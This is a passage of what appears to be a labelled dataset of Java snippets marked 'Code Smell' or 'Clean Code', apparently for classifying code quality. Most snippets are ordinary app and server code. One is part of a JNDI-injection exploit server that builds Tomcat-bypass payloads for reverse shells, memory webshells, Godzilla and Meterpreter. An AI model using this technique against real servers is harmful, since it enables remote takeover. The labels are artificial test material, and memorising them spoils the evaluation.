    XposedHelpers.findAndHookMethod(NotiMsgModel,""getUnreadCount"",XC_MethodReplacement.returnConstant(0));
    if (NotiUnreadCountKt_hasUnread != null)     XposedBridge.hookMethod(NotiUnreadCountKt_hasUnread,XC_MethodReplacement.returnConstant(false));
    if (IconWithDotAndCountView_setUnreadCount != null)     XposedBridge.hookMethod(IconWithDotAndCountView_setUnreadCount,XC_MethodReplacement.returnConstant(null));
    if (CountDotView_setUnreadCount != null)     XposedBridge.hookMethod(CountDotView_setUnreadCount,new XC_MethodReplacement(){
      @Override protected Object replaceHookedMethod(      MethodHookParam param){
        View obj=(View)param.thisObject;
        obj.setVisibility(View.GONE);
        return null;
      }
    }
);
    if (ViewModel != null) {
      XposedHelpers.findAndHookConstructor(ViewModel,View.class,new XC_MethodHook(){
        @Override protected void afterHookedMethod(        MethodHookParam param){
          try {
            ViewGroup view=(ViewGroup)param.args[0];
            if (view.getChildCount() == 2) {
              view.setVisibility(View.GONE);
            }
          }
 catch (          Throwable ignored) {
          }
        }
      }
);
    }
    if (RevisitView_getCanShowRedDot != null)     XposedBridge.hookMethod(RevisitView_getCanShowRedDot,XC_MethodReplacement.returnConstant(false));
  }
}",1,Code Smell
"@Override public CfQrCodeExample getExampleByQuery(CfQrCodeQuery cfQrCodeQuery){
  CfQrCodeExample cfQrCodeExample=new CfQrCodeExample();
  CfQrCodeExample.Criteria criteria=cfQrCodeExample.createCriteria();
  if (StringUtils.isNotEmpty(cfQrCodeQuery.getCodeType())) {
    criteria.andCodeTypeEqualTo(cfQrCodeQuery.getCodeType());
  }
  if (StringUtils.isNotEmpty(cfQrCodeQuery.getSourceId())) {
    criteria.andSourceIdEqualTo(cfQrCodeQuery.getSourceId());
  }
  if (StringUtils.isNotEmpty(cfQrCodeQuery.getCreaterId())) {
    criteria.andCreaterIdEqualTo(cfQrCodeQuery.getCreaterId());
  }
  if (StringUtils.isNotEmpty(cfQrCodeQuery.getFromUid())) {
    criteria.andFromUidEqualTo(cfQrCodeQuery.getFromUid());
  }
  if (StringUtils.isNotEmpty(cfQrCodeQuery.getToUid())) {
    criteria.andToUidEqualTo(cfQrCodeQuery.getToUid());
  }
  if (cfQrCodeQuery.getMinCreateTime() != null) {
    criteria.andCreateTimeGreaterThanOrEqualTo(cfQrCodeQuery.getMinCreateTime());
  }
  if (cfQrCodeQuery.getMaxCreateTime() != null) {
    criteria.andCreateTimeLessThanOrEqualTo(cfQrCodeQuery.getMaxCreateTime());
  }
  if (cfQrCodeQuery.getMinEffectiveTime() != null) {
    criteria.andEffectiveTimeGreaterThanOrEqualTo(cfQrCodeQuery.getMinEffectiveTime());
  }
  if (cfQrCodeQuery.getMaxEffectiveTime() != null) {
    criteria.andEffectiveTimeLessThanOrEqualTo(cfQrCodeQuery.getMaxEffectiveTime());
  }
  if (StringUtils.isNotEmpty(cfQrCodeQuery.getOrderBy())) {
    cfQrCodeExample.setOrderByClause(cfQrCodeQuery.getOrderBy());
  }
  if (cfQrCodeQuery.getPage() != null && cfQrCodeQuery.getSize() != null) {
    PageHelper.startPage(cfQrCodeQuery.getPage(),cfQrCodeQuery.getSize());
  }
  return cfQrCodeExample;
}
",0,Clean Code
"@Override public boolean mouseScrolled(double pMouseX,double pMouseY,double pDelta){
  if (destinationSuggestions != null && destinationSuggestions.mouseScrolled(Mth.clamp(pDelta,-1.0D,1.0D)))   return true;
  if (editingCondition != null || editingDestination != null)   return super.mouseScrolled(pMouseX,pMouseY,pDelta);
  if (hasShiftDown()) {
    List<ScheduleEntry> entries=schedule.entries;
    int y=(int)(pMouseY - topPos - 25 + scroll.getValue());
    for (int i=0; i < entries.size(); i++) {
      ScheduleEntry entry=entries.get(i);
      int maxRows=0;
      for (      List<ScheduleWaitCondition> list : entry.conditions)       maxRows=Math.max(maxRows,list.size());
      int cardHeight=CARD_HEADER + 24 + maxRows * 18;
      if (y >= cardHeight) {
        y-=cardHeight + 9;
        if (y < 0)         break;
        continue;
      }
      if (!isConditionAreaScrollable(entry))       break;
      if (y < 24)       break;
      if (pMouseX < leftPos + 25)       break;
      if (pMouseX > leftPos + 205)       break;
      float chaseTarget=horizontalScrolls.get(i).getChaseTarget();
      if (pDelta > 0 && !Mth.equal(chaseTarget,0)) {
        horizontalScrolls.get(i).chase(chaseTarget - 1,0.5f,Chaser.EXP);
        return true;
      }
      if (pDelta < 0 && !Mth.equal(chaseTarget,entry.conditions.size() - 1)) {
        horizontalScrolls.get(i).chase(chaseTarget + 1,0.5f,Chaser.EXP);
        return true;
      }
      return false;
    }
  }
  float chaseTarget=scroll.getChaseTarget();
  float max=40 - 173;
  for (  ScheduleEntry scheduleEntry : schedule.entries) {
    int maxRows=0;
    for (    List<ScheduleWaitCondition> list : scheduleEntry.conditions)     maxRows=Math.max(maxRows,list.size());
    max+=CARD_HEADER + 24 + maxRows * 18 + 10;
  }
  if (max > 0) {
    chaseTarget-=pDelta * 12;
    chaseTarget=Mth.clamp(chaseTarget,0,max);
    scroll.chase((int)chaseTarget,0.7f,Chaser.EXP);
  }
 else   scroll.chase(0,0.7f,Chaser.EXP);
  return super.mouseScrolled(pMouseX,pMouseY,pDelta);
}",1,Code Smell
"@Override protected void decode(ChannelHandlerContext ctx,ByteBuf buffer,List<Object> out) throws Exception {
  buffer.markReaderIndex();
  int totalLen=buffer.readInt();
  LOGGER.debug(""decode totalLen : {}"",totalLen);
  if (totalLen != buffer.readableBytes()) {
    LOGGER.error(""totalLen is not equal readableBytes.total:"" + totalLen + "";readableBytes:""+ buffer.readableBytes());
    buffer.resetReaderIndex();
    throw new Exception(""totalLen is not equal readableBytes.total"");
  }
  int msgType=buffer.readByte() & 0x1f;
  if (msgType == 4) {
    LOGGER.info(""debug decode"");
  }
  if (msgType == 3 | msgType == 5) {
    int bodyLength=buffer.readInt();
    if (bodyLength >= totalLen) {
      LOGGER.error(""bodyLen is greater than totalLen.totalLen:"" + totalLen + "";bodyLen:""+ bodyLength);
      buffer.resetReaderIndex();
      throw new Exception(""bodyLen is greater than totalLen.totalLen"");
    }
    byte[] bodyBytes=null;
    if (bodyLength > 0) {
      bodyBytes=new byte[bodyLength];
      buffer.readBytes(bodyBytes);
    }
    int attrLength=buffer.readInt();
    byte[] attrBytes=null;
    if (attrLength > 0) {
      attrBytes=new byte[attrLength];
      buffer.readBytes(attrBytes);
    }
    EncodeObject object=new EncodeObject(bodyBytes,new String(attrBytes,StandardCharsets.UTF_8));
    object.setMsgtype(5);
    out.add(object);
  }
 else   if (msgType == 7) {
    int seqId=buffer.readInt();
    int attrLen=buffer.readShort();
    byte[] attrBytes=null;
    if (attrLen > 0) {
      attrBytes=new byte[attrLen];
      buffer.readBytes(attrBytes);
    }
    EncodeObject object=new EncodeObject(new String(attrBytes,StandardCharsets.UTF_8));
    object.setMessageId(String.valueOf(seqId));
    buffer.readShort();
    object.setMsgtype(msgType);
    out.add(object);
  }
 else   if (msgType == 8) {
    buffer.skipBytes(4 + 1 + 4);
    final short load=buffer.readShort();
    int attrLen=buffer.readShort();
    byte[] attrBytes=null;
    if (attrLen > 0) {
      attrBytes=new byte[attrLen];
      buffer.readBytes(attrBytes);
    }
    buffer.skipBytes(2);
    String attrs=(attrBytes == null ? """" : new String(attrBytes,StandardCharsets.UTF_8));
    EncodeObject object=new EncodeObject(attrs);
    object.setMsgtype(8);
    object.setLoad(load);
    out.add(object);
  }
}",1,Code Smell
"@Override public boolean onOptionsItemSelected(@NonNull MenuItem item){
  int id=item.getItemId();
  if (id == R.id.action_refresh) {
    mModel.reload();
    return true;
  }
 else   if (id == R.id.action_shortcut) {
    Uri uri=mPathListAdapter.getCurrentUri();
    if (uri != null) {
      mModel.createShortcut(uri);
    }
    return true;
  }
 else   if (id == R.id.action_storage) {
    ThreadUtils.postOnBackgroundThread(() -> {
      ArrayMap<String,Uri> storageLocations=StorageUtils.getAllStorageLocations(mActivity);
      if (storageLocations.size() == 0) {
        mActivity.runOnUiThread(() -> {
          if (isDetached())           return;
          new MaterialAlertDialogBuilder(mActivity).setTitle(R.string.storage).setMessage(R.string.no_volumes_found).setNegativeButton(R.string.ok,null).show();
        }
);
        return;
      }
      Uri[] backupVolumes=new Uri[storageLocations.size()];
      CharSequence[] backupVolumesStr=new CharSequence[storageLocations.size()];
      for (int i=0; i < storageLocations.size(); ++i) {
        backupVolumes[i]=storageLocations.valueAt(i);
        backupVolumesStr[i]=new SpannableStringBuilder(storageLocations.keyAt(i)).append(""\n"").append(getSecondaryText(mActivity,getSmallerText(backupVolumes[i].getPath())));
      }
      mActivity.runOnUiThread(() -> {
        if (isDetached())         return;
        new SearchableItemsDialogBuilder<>(mActivity,backupVolumesStr).setTitle(R.string.storage).setOnItemClickListener((dialog,which,item1) -> {
          mModel.loadFiles(backupVolumes[which]);
          dialog.dismiss();
        }
).setNegativeButton(R.string.cancel,null).show();
      }
);
    }
);
    return true;
  }
 else   if (id == R.id.action_list_options) {
    FmListOptions listOptions=new FmListOptions();
    listOptions.setListOptionActions(mModel);
    listOptions.show(getChildFragmentManager(),FmListOptions.TAG);
    return true;
  }
 else   if (id == R.id.action_paste) {
    FmTasks.FmTask task=FmTasks.getInstance().dequeue();
    if (task != null) {
      startBatchPaste(task);
    }
    return true;
  }
 else   if (id == R.id.action_new_window) {
    Intent intent=new Intent(mActivity,FmActivity.class);
    if (!mModel.getOptions().isVfs) {
      intent.setDataAndType(mModel.getCurrentUri(),DocumentsContract.Document.MIME_TYPE_DIR);
    }
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_DOCUMENT | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
    startActivity(intent);
    return true;
  }
 else   if (id == R.id.action_settings) {
    Intent intent=SettingsActivity.getIntent(requireContext(),""files_prefs"");
    startActivity(intent);
    return true;
  }
  return super.onOptionsItemSelected(item);
}",0,Clean Code
"/** 
 * Check all components that needs to be disabled/enabled and assign to be disabled/enabled if necessary.
 */
public int invalidateComponents(){
  int invalidated=0;
  boolean canCheckExistence=mComponents != null;
  List<ComponentRule> allEntries=getAllComponents();
  for (  ComponentRule entry : allEntries) {
    if (canCheckExistence && !mComponents.contains(entry.name)) {
      removeEntry(entry);
      ++invalidated;
      continue;
    }
    try {
      int s=PackageManagerCompat.getComponentEnabledSetting(new ComponentName(entry.packageName,entry.name),userId);
switch (entry.getComponentStatus()) {
case ComponentRule.COMPONENT_BLOCKED_IFW_DISABLE:
case ComponentRule.COMPONENT_DISABLED:
        if (s == PackageManager.COMPONENT_ENABLED_STATE_ENABLED || s == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT) {
          addComponent(entry.name,entry.type,entry.getToBe());
          ++invalidated;
        }
      break;
case ComponentRule.COMPONENT_ENABLED:
    if (s != PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
      addComponent(entry.name,entry.type,entry.getToBe());
      ++invalidated;
    }
  break;
}
}
 catch (Throwable ignore) {
}
}
return invalidated;
}",1,Code Smell
"private int readLastScrValue(ExtractorInput input,PositionHolder seekPositionHolder) throws IOException, InterruptedException {
  long inputLength=input.getLength();
  int bytesToSearch=(int)Math.min(TIMESTAMP_SEARCH_BYTES,inputLength);
  long searchStartPosition=inputLength - bytesToSearch;
  if (input.getPosition() != searchStartPosition) {
    seekPositionHolder.position=searchStartPosition;
    return Extractor.RESULT_SEEK;
  }
  packetBuffer.reset(bytesToSearch);
  input.resetPeekPosition();
  input.peekFully(packetBuffer.data,0,bytesToSearch);
  lastScrValue=readLastScrValueFromBuffer(packetBuffer);
  isLastScrValueRead=true;
  return Extractor.RESULT_CONTINUE;
}",0,Clean Code
"public static String processProxyListFile(Context ctx,File proxyListFile){
  try {
    if (proxyListFile.length() > 2 * 1024 * 1024L) {
      throw new IllegalArgumentException(""file too large."");
    }
    JSONObject proxyRootObject=new JSONObject(FileUtil.readUtf8String(proxyListFile));
    int version=proxyRootObject.optInt(""nekox_proxy_list_version"",1);
    if (version == 1) {
      if (proxyRootObject.isNull(""proxies"")) {
        throw new IllegalArgumentException(""proxies array not found."");
      }
      JSONArray proxyArray=proxyRootObject.getJSONArray(""proxies"");
      if (proxyArray.length() == 0) {
        throw new IllegalArgumentException(""Empty proxy list."");
      }
      LinkedList<String> imported=new LinkedList<>();
      LinkedHashMap<String,String> errors=new LinkedHashMap<>();
      for (int index=0; index < proxyArray.length(); index++) {
        String proxyUrl=proxyArray.getString(index);
        try {
          imported.add(ProxyUtil.importInBackground(proxyUrl).getTitle());
        }
 catch (        Exception ex) {
          errors.put(proxyUrl.length() < 15 ? proxyUrl : (proxyUrl.substring(0,15) + ""...""),ex.getMessage());
        }
      }
      StringBuilder status=new StringBuilder();
      if (!imported.isEmpty()) {
        status.append(LocaleController.getString(""ImportedProxies"",R.string.ImportedProxies));
        for (        String success : imported) {
          status.append(""\n"").append(success);
        }
        if (!errors.isEmpty()) {
          status.append(""\n\n"");
        }
      }
      if (!errors.isEmpty()) {
        status.append(LocaleController.getString(""ErrorsInImport"",R.string.ErrorsInImport));
        for (        Map.Entry<String,String> error : errors.entrySet()) {
          status.append(""\n"").append(error.getKey()).append("": "").append(error.getValue());
        }
      }
      if (imported.isEmpty()) {
        AlertUtil.showSimpleAlert(ctx,status.toString());
      }
 else {
        return status.toString();
      }
    }
 else {
      throw new IllegalArgumentException(""invalid proxy list version "" + version + ""."");
    }
  }
 catch (  Exception e) {
    AlertUtil.showSimpleAlert(ctx,LocaleController.getString(""InvalidProxyFile"",R.string.InvalidProxyFile) + proxyListFile.getPath() + ""\n\n""+ e.getMessage());
  }
  return null;
}",1,Code Smell
"/** 
 * execute watch event
 */
private synchronized void watchIfNecessary() throws PluginLifeCycleException {
  if (watched.compareAndSet(false,true)) {
    List<EnhanceModel> enhanceModels=getEnhanceModels();
    if (CollectionUtils.isEmpty(enhanceModels)) {
      throw new PluginLifeCycleException(""enhance models is empty, plugin type is "" + identity());
    }
    for (    EnhanceModel em : enhanceModels) {
      EventWatchBuilder.IBuildingForBehavior behavior=null;
      EventWatchBuilder.IBuildingForClass builder4Class=new EventWatchBuilder(watcher).onClass(em.getClassPattern());
      builder4Class.isIncludeBootstrap(em.isIncludeBootstrap());
      if (em.isIncludeSubClasses()) {
        builder4Class=builder4Class.includeSubClasses();
      }
      for (      EnhanceModel.MethodPattern mp : em.getMethodPatterns()) {
        behavior=builder4Class.onBehavior(mp.getMethodName());
        if (ArrayUtils.isNotEmpty(mp.getParameterType())) {
          behavior.withParameterTypes(mp.getParameterType());
        }
        if (ArrayUtils.isNotEmpty(mp.getAnnotationTypes())) {
          behavior.hasAnnotationTypes(mp.getAnnotationTypes());
        }
      }
      if (behavior != null) {
        int watchId=behavior.onWatch(getEventListener(listener),em.getWatchTypes()).getWatchId();
        watchIds.add(watchId);
        log.info(""add watcher success,type={},watcherId={}"",getType().name(),watchId);
      }
    }
  }
}",1,Code Smell
"/** 
 * Query group's offset records stored in broker.
 * @param msgStore       history offset store
 * @param groupName      group name
 * @param requestOffset  request offset
 * @param recordStamp    record timestamp
 * @param msgCount       at most record count
 * @param maxRetryCnt    max query turns
 * @param strBuff        string buffer
 */
private void queryGroupStoredOffsets(MessageStore msgStore,String groupName,long requestOffset,long recordStamp,int msgCount,int maxRetryCnt,StringBuilder strBuff){
  int msgTypeCode;
  int partitionId;
  int msgAccCnt=0;
  boolean msgMatched;
  Throwable qryThrow;
  GetMessageResult getMessageResult;
  msgTypeCode=groupName.hashCode();
  partitionId=Math.abs(msgTypeCode) % TServerConstants.OFFSET_HISTORY_NUMPARTS;
  Set<String> filterCodes=new HashSet<>();
  filterCodes.add(groupName);
  ConsumerNodeInfo consumerNodeInfo=new ConsumerNodeInfo(broker.getStoreManager(),groupName,""offsetConsumer"",filterCodes,"""",System.currentTimeMillis(),"""","""");
  int qryRetryCount=0;
  long itemInitOffset=requestOffset;
  int maxTransferSize=broker.getStoreManager().getMaxMsgTransferSize();
  do {
    qryThrow=null;
    try {
      getMessageResult=msgStore.getMessages(303,itemInitOffset,partitionId,consumerNodeInfo,TServerConstants.OFFSET_HISTORY_NAME,maxTransferSize,recordStamp);
    }
 catch (    Throwable e2) {
      qryThrow=e2;
      continue;
    }
    if (getMessageResult.transferedMessageList == null || getMessageResult.transferedMessageList.isEmpty()) {
      itemInitOffset+=getMessageResult.lastReadOffset;
      continue;
    }
    msgMatched=false;
    List<Message> messageList=DataConverterUtil.convertMessage(TServerConstants.OFFSET_HISTORY_NAME,getMessageResult.transferedMessageList);
    for (    Message message : messageList) {
      if (message == null) {
        continue;
      }
      if (!groupName.equals(message.getAttrValue(TServerConstants.TOKEN_OFFSET_GROUP))) {
        continue;
      }
      msgMatched=true;
      if (msgAccCnt++ == 0) {
        strBuff.append(""{\""groupName\"":\"""").append(groupName).append(""\"",\""result\"":true,\""errMsg\"":\""ok\"",\""records\"":["").append(StringUtils.newStringUtf8(message.getData()));
      }
 else {
        strBuff.append("","").append(StringUtils.newStringUtf8(message.getData()));
      }
      if (msgAccCnt >= msgCount) {
        break;
      }
    }
    if (msgMatched) {
      break;
    }
    itemInitOffset+=getMessageResult.lastReadOffset;
  }
 while (++qryRetryCount < maxRetryCnt);
  if (msgAccCnt > 0) {
    strBuff.append(""],\""recordCount\"":"").append(msgAccCnt).append(""}"");
  }
 else {
    if (qryThrow == null) {
      strBuff.append(""{\""groupName\"":\"""").append(groupName).append(""\"",\""result\"":false,\""errMsg\"":\""Could not find record!\""}"");
    }
 else {
      strBuff.append(""{\""groupName\"":\"""").append(groupName).append(""\"",\""result\"":false,\""errMsg\"":\""Get Message failure: "").append(qryThrow.getMessage()).append(""\""}"");
    }
  }
}",1,Code Smell
"/** 
 * Trying to filter languages preferred by the user
 */
private MediaTrack[][] filterByLanguage(MediaTrack[][] trackGroupList,MediaTrack originTrack){
  if (!(originTrack instanceof AudioTrack) || trackGroupList.length <= 1) {
    return trackGroupList;
  }
  String audioLanguage=PlayerData.instance(mContext).getAudioLanguage();
  String resultLanguage=null;
  String originLanguage=null;
  if (!TextUtils.isEmpty(audioLanguage) && originTrack.isSaved) {
    resultLanguage=audioLanguage;
  }
  if (originTrack.format != null && !TextUtils.isEmpty(originTrack.format.language)) {
    originLanguage=originTrack.format.language;
  }
  if (resultLanguage == null && originLanguage == null) {
    return trackGroupList;
  }
  List<MediaTrack[]> resultTracks=null;
  List<MediaTrack[]> originTracks=null;
  List<MediaTrack[]> resultTracksFallback=null;
  for (  MediaTrack[] trackGroup : trackGroupList) {
    if (trackGroup != null && trackGroup.length >= 1) {
      MediaTrack mediaTrack=trackGroup[0];
      if (mediaTrack != null && mediaTrack.format != null) {
        if (Helpers.startsWith(mediaTrack.format.language,resultLanguage)) {
          if (resultTracks == null) {
            resultTracks=new ArrayList<>();
          }
          resultTracks.add(trackGroup);
        }
 else         if (Helpers.startsWith(mediaTrack.format.language,originLanguage)) {
          if (originTracks == null) {
            originTracks=new ArrayList<>();
          }
          originTracks.add(trackGroup);
        }
 else         if (Helpers.startsWith(mediaTrack.format.language,DEFAULT_LANGUAGE)) {
          if (resultTracksFallback == null) {
            resultTracksFallback=new ArrayList<>();
          }
          resultTracksFallback.add(trackGroup);
        }
      }
    }
  }
  if (resultTracks != null && !resultTracks.isEmpty()) {
    return resultTracks.toArray(new MediaTrack[0][]);
  }
  if (originTracks != null && !originTracks.isEmpty()) {
    return originTracks.toArray(new MediaTrack[0][]);
  }
  if (resultTracksFallback != null && !resultTracksFallback.isEmpty()) {
    return resultTracksFallback.toArray(new MediaTrack[0][]);
  }
  return trackGroupList;
}",1,Code Smell
"private void reduceCraftingGrid(boolean makeAll){
  if (gridSize == -1)   return;
  int crafted;
  if (!makeAll) {
    crafted=1;
  }
 else {
    crafted=0;
    for (int i=0; i < gridSize; i++) {
      GeyserItemStack item=getItem(i + 1);
      if (!item.isEmpty()) {
        if (crafted == 0) {
          crafted=item.getAmount();
        }
        crafted=Math.min(crafted,item.getAmount());
      }
    }
  }
  for (int i=0; i < gridSize; i++) {
    final int slot=i + 1;
    GeyserItemStack item=getItem(slot);
    if (!item.isEmpty()) {
      sub(slot,item,crafted);
    }
  }
}",1,Code Smell
"@Override public void sendResult(InMemoryInterceptedSearchResult result,String base) throws Exception {
  System.out.println(""[+] Sending LDAP ResourceRef result for "" + base + "" with javax.el.ELProcessor payload"");
  Entry e=new Entry(base);
  e.addAttribute(""javaClassName"",""java.lang.String"");
  ResourceRef ref=new ResourceRef(""javax.el.ELProcessor"",null,"""","""",true,""org.apache.naming.factory.BeanFactory"",null);
  ref.add(new StringRefAddr(""forceString"",""x=eval""));
  TomcatBypassHelper helper=new TomcatBypassHelper();
  String code=null;
switch (type) {
case dnslog:
    code=helper.getDnsRequestCode(params[0]);
  break;
case command:
code=helper.getExecCode(params[0]);
break;
case reverseshell:
code=helper.getReverseShellCode(params[0],params[1]);
break;
case tomcatecho:
code=helper.injectTomcatEcho();
break;
case springecho:
code=helper.injectSpringEcho();
break;
case tomcatmemshell1:
code=helper.injectTomcatMemshell1();
break;
case tomcatmemshell2:
code=helper.injectTomcatMemshell2();
break;
case springmemshell:
code=helper.injectSpringMemshell();
break;
case tomcatmemshell3:
code=helper.injectmemshell3();
break;
case issuccess:
code=helper.injectSuccess();
break;
case godzillamemshell:
code=helper.injectGodzilla();
break;
case meterpreter:
code=helper.injectMeterpreter();
break;
}
String finalPayload=payloadTemplate.replace(""{replacement}"",code);
ref.add(new StringRefAddr(""x"",finalPayload));
e.addAttribute(""javaSerializedData"",Util.serialize(ref));
result.sendSearchEntry(e);
result.setResult(new LDAPResult(0,ResultCode.SUCCESS));
}",1,Code Smell
"/** 
 * @param majorVersion The client manifest major version.
 * @param minorVersion The client manifest minor version.
 * @param timescale The timescale of the media as the number of units that pass in one second.
 * @param duration The overall presentation duration in units of the timescale attribute, or 0 ifthe duration is unknown.
 * @param dvrWindowLength The length of the trailing window in units of the timescale attribute,or 0 if this attribute is unspecified or not applicable.
 * @param lookAheadCount The number of fragments in a lookahead, or {@link #UNSET_LOOKAHEAD} ifthis attribute is unspecified or not applicable.
 * @param isLive True if the manifest describes a live presentation still in progress. Falseotherwise.
 * @param protectionElement Content protection information, or null if the content is notprotected.
 * @param streamElements The contained stream elements.
 */
public SsManifest(int majorVersion,int minorVersion,long timescale,long duration,long dvrWindowLength,int lookAheadCount,boolean isLive,ProtectionElement protectionElement,StreamElement[] streamElements){
  this(majorVersion,minorVersion,duration == 0 ? C.TIME_UNSET : Util.scaleLargeTimestamp(duration,C.MICROS_PER_SECOND,timescale),dvrWindowLength == 0 ? C.TIME_UNSET : Util.scaleLargeTimestamp(dvrWindowLength,C.MICROS_PER_SECOND,timescale),lookAheadCount,isLive,protectionElement,streamElements);
}
private SsManifest(int majorVersion,int minorVersion,long durationUs,long dvrWindowLengthUs,int lookAheadCount,boolean isLive,ProtectionElement protectionElement,StreamElement[] streamElements){
  this.majorVersion=majorVersion;
  this.minorVersion=minorVersion;
  this.durationUs=durationUs;
  this.dvrWindowLengthUs=dvrWindowLengthUs;
  this.lookAheadCount=lookAheadCount;
  this.isLive=isLive;
  this.protectionElement=protectionElement;
  this.streamElements=streamElements;
}",0,Clean Code
"private static void validateNoCyclesStep(Set<ClassQName> alreadySeen,MethodInfo method,boolean includeHolder){
  Set<ClassQName> outgoing=new HashSet<>();
  if (includeHolder) {
    outgoing.add(new ClassQName(method.getDeclaringClass()));
  }
  for (  ParameterInfo ppi : method.getParameters()) {
    outgoing.add(new ClassQName(ppi.getType()));
  }
  if (outgoing.isEmpty()) {
    return;
  }
  Set<ClassQName> currentSeen=new HashSet<>();
  currentSeen.addAll(alreadySeen);
  for (  ClassQName ci : outgoing) {
    if (!currentSeen.add(ci)) {
      throw new GenerationException(""@"" + State.class.getSimpleName() + "" dependency cycle is detected: ""+ ci.ci.getQualifiedName()+ "" ""+ currentSeen,method);
    }
    Set<ClassQName> nextSeen=new HashSet<>();
    nextSeen.addAll(alreadySeen);
    nextSeen.add(ci);
    for (    MethodInfo mi : BenchmarkGeneratorUtils.getAllMethods(ci.ci)) {
      if (mi.getAnnotation(Setup.class) != null || mi.getAnnotation(TearDown.class) != null) {
        validateNoCyclesStep(nextSeen,mi,false);
      }
    }
  }
}
",1,Code Smell
"public void setTextAndValueAndTypeAndThumb(String text,String value,String type,String thumb,int resId,boolean divider){
  nameTextView.setText(text);
  dateTextView.setText(value);
  if (type != null) {
    extTextView.setVisibility(VISIBLE);
    extTextView.setText(type.toLowerCase());
  }
 else {
    extTextView.setVisibility(INVISIBLE);
  }
  needDivider=divider;
  if (resId == 0) {
    placeholderImageView.setImageResource(AndroidUtilities.getThumbForNameOrMime(text,type,false));
    placeholderImageView.setVisibility(VISIBLE);
  }
 else {
    placeholderImageView.setVisibility(INVISIBLE);
  }
  if (thumb != null || resId != 0) {
    if (thumb != null) {
      if (viewType != VIEW_TYPE_CACHE) {
        thumbImageView.setImage(thumb,""42_42"",null);
      }
    }
 else {
      Drawable drawable=Theme.createCircleDrawableWithIcon(AndroidUtilities.dp(42),resId);
      int iconKey;
      int backKey;
      if (resId == R.drawable.files_storage) {
        backKey=Theme.key_chat_attachLocationBackground;
        iconKey=Theme.key_chat_attachIcon;
      }
 else       if (resId == R.drawable.files_gallery) {
        backKey=Theme.key_chat_attachContactBackground;
        iconKey=Theme.key_chat_attachIcon;
      }
 else       if (resId == R.drawable.files_music) {
        backKey=Theme.key_chat_attachAudioBackground;
        iconKey=Theme.key_chat_attachIcon;
      }
 else       if (resId == R.drawable.files_internal) {
        backKey=Theme.key_chat_attachGalleryBackground;
        iconKey=Theme.key_chat_attachIcon;
      }
 else {
        backKey=Theme.key_files_folderIconBackground;
        iconKey=Theme.key_files_folderIcon;
      }
      Theme.setCombinedDrawableColor(drawable,getThemedColor(backKey),false);
      Theme.setCombinedDrawableColor(drawable,getThemedColor(iconKey),true);
      thumbImageView.setImageDrawable(drawable);
    }
    thumbImageView.setVisibility(VISIBLE);
  }
 else {
    extTextView.setAlpha(1.0f);
    placeholderImageView.setAlpha(1.0f);
    if (viewType != VIEW_TYPE_CACHE) {
      thumbImageView.setImageBitmap(null);
      thumbImageView.setVisibility(INVISIBLE);
    }
  }
  setWillNotDraw(!needDivider);
}",0,Clean Code
"private boolean builtinIgnoreInvokeInstruction(MethodVisitor m,InvokeInstruction instruction,CallGraphEntry callGraphEntry){
  final String calleeMethod=callGraphEntry.getCalleeMethod();
  final String calleeClass=callGraphEntry.getCalleeClazz();
  if (ignore.ignoreClassInnerCall() && m.callerClass.equals(calleeClass)) {
    return true;
  }
  if (!callGraphEntry.getCalleeClazz().contains(""."")) {
    return true;
  }
  if (calleeMethod.equals(methodConstructor) || calleeMethod.equals(methodStaticInit)) {
    return true;
  }
  if (calleeMethod.contains(""$"") || calleeClass.contains(""$"")) {
    return true;
  }
  if (instruction == null) {
    return false;
  }
  int args=instruction.getArgumentTypes(m.constantPoolGen).length;
  if (calleeMethod.startsWith(""get"") && args == 0) {
    log.debug(""getter ignored: {}.{} -> {}.{}"",m.callerClass,m.callerMethod,calleeClass,calleeMethod);
    return true;
  }
  if (calleeMethod.startsWith(""set"") && args == 1) {
    log.debug(""setter ignored: {}.{} -> {}.{}"",m.callerClass,m.callerMethod,calleeClass,calleeMethod);
    return true;
  }
  return false;
}",1,Code Smell
"private void dropTable(String tableName,DialectProperties dialectProperties,Long dataSourceId){
  DropParam dropParam=DropParam.builder().dataSourceId(dataSourceId).databaseName(dialectProperties.getDatabaseName()).tableName(dialectProperties.toCase(tableName)).build();
  tableService.drop(dropParam);
  TablePageQueryParam tablePageQueryParam=new TablePageQueryParam();
  tablePageQueryParam.setDataSourceId(dataSourceId);
  tablePageQueryParam.setDatabaseName(dialectProperties.getDatabaseName());
  tablePageQueryParam.setTableName(dialectProperties.toCase(tableName));
  List<Table> tableList=tableService.pageQuery(tablePageQueryParam,TableSelector.builder().columnList(Boolean.TRUE).indexList(Boolean.TRUE).build()).getData();
  log.info(""After deleting the table, the data returns {}"",JSON.toJSONString(tableList));
  Assertions.assertEquals(0L,tableList.size(),""Query table structure failed"");
}
@Test @Order(Integer.MAX_VALUE) public void dropTable(){
  for (  DialectProperties dialectProperties : dialectPropertiesList) {
    try {
      String dbTypeEnum=dialectProperties.getDbType();
      Long dataSourceId=TestUtils.nextLong();
      Long consoleId=TestUtils.nextLong();
      DataSourcePreConnectParam dataSourceCreateParam=new DataSourcePreConnectParam();
      dataSourceCreateParam.setType(dbTypeEnum);
      dataSourceCreateParam.setUrl(dialectProperties.getUrl());
      dataSourceCreateParam.setUser(dialectProperties.getUsername());
      dataSourceCreateParam.setPassword(dialectProperties.getPassword());
      dataSourceService.preConnect(dataSourceCreateParam);
      ConsoleConnectParam consoleCreateParam=new ConsoleConnectParam();
      consoleCreateParam.setDataSourceId(dataSourceId);
      consoleCreateParam.setConsoleId(consoleId);
      consoleCreateParam.setDatabaseName(dialectProperties.getDatabaseName());
      consoleService.createConsole(consoleCreateParam);
      DlExecuteParam templateQueryParam=new DlExecuteParam();
      templateQueryParam.setConsoleId(consoleId);
      templateQueryParam.setDataSourceId(dataSourceId);
      templateQueryParam.setSql(dialectProperties.getDropTableSql(TABLE_NAME));
      dlTemplateService.execute(templateQueryParam);
    }
 catch (    Exception e) {
      log.warn(""Failed to delete table structure."",e);
    }
  }
}",0,Clean Code
"private void createButtons(JPanel topPanel){
  final JPanel buttonPanel=new JPanel(new GridBagLayout());
  this.saveButton=new JButton(""Save"");
  this.saveButton.setMnemonic(KeyEvent.VK_S);
  final GridBagConstraints saveConstraints=createButtonConstraints(0,0);
  this.saveButton.addActionListener(e -> saveConfigValues());
  buttonPanel.add(this.saveButton,saveConstraints);
  this.cancelButton=new JButton(""Cancel"");
